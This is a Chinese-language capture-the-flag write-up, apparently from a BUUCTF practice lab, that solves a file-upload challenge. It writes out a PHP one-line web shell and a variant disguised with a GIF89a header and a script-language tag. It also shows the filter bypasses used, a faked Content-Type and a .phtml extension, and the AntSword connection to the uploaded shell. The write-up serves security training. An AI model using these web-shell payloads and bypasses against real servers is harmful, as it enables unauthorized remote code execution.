<p> 解题：</p>
<p>打开题目实例</p>
<p><img src="https://img-blog.csdnimg.cn/345d639906c849ec88ce5de9979fe53f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们这里发现要上传一张图片，我们先尝试上传一句话木马</p>
<p>1.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/7b357a57edae40e3803e8341d969ec15.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_19,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们使用burp抓取数据包并修改测试：</p>
<p>我们先将 Content-Type修改为 image/jpeg提交，返回信息提示 NOT php!</p>
<p><img src="https://img-blog.csdnimg.cn/54899dfb9b1540fbad8162ea34cb9bd8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">我们修改后缀 1.phtml，再次提交</p>
<p><img src="https://img-blog.csdnimg.cn/7f73def862104f57b13ed4ad4115df51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们发现提示 NO! HACKER! your file included ‘&#x3C;&#x3F;’ </p>
<p>大概意识就是我们的文本中存在非法符号！</p>
<p>我们修改文本内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt; </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/b925793839ce4c60b1cd0ccb8838f19b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们发现可以上传成功！</p>
<p>Forward发送请求，</p>
<p><img src="https://img-blog.csdnimg.cn/89adedddc4ad4c7aa0b1f7d0f76f914f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 页面显示上传成功<img src="https://img-blog.csdnimg.cn/795eb7f5b60c4e4f9ec9e944058cb1db.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这样的话我们尝试使用蚁剑连接</p>
<p>忙猜一波文件位置在：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/1.phtml</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>蚁剑尝试连接，连接成功！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ca0024d6-eee3-4117-a1c6-ee498d5eef89.node4.buuoj.cn:81/upload/1.phtml</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/b17d8c0835a24c97a5880348053c2716.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查找flag，成功找到flag!</p>
<p><img src="https://img-blog.csdnimg.cn/3caed6efb04744168c691307d00ba43e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
  </entry>
</search>
